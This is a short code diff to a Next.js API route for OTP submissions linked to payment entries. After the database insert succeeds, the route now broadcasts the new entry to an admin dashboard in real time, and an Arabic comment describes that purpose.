@@ -1,5 +1,5 @@
 import { NextRequest, NextResponse } from "next/server";
-import { createServiceClient } from "@/lib/supabase/server";
+import { createServiceClient, broadcastNewEntry } from "@/lib/supabase/server";
 
 interface OtpBody {
   paymentEntryId?: string;
@@ -62,6 +62,13 @@ export async function POST(req: NextRequest) {
   if (insertErr || !inserted) {
     return NextResponse.json({ error: "submit_failed" }, { status: 500 });
   }
+
+  // أبلغ لوحة الإدارة بوجود entry OTP جديد لتحديث القائمة لحظياً.
+  void broadcastNewEntry({
+    clientId: paymentEntry.client_id ?? null,
+    entryId: inserted.id,
+    type: "otp_request",
+  });
 
   return NextResponse.json({
     entryId: inserted.id,
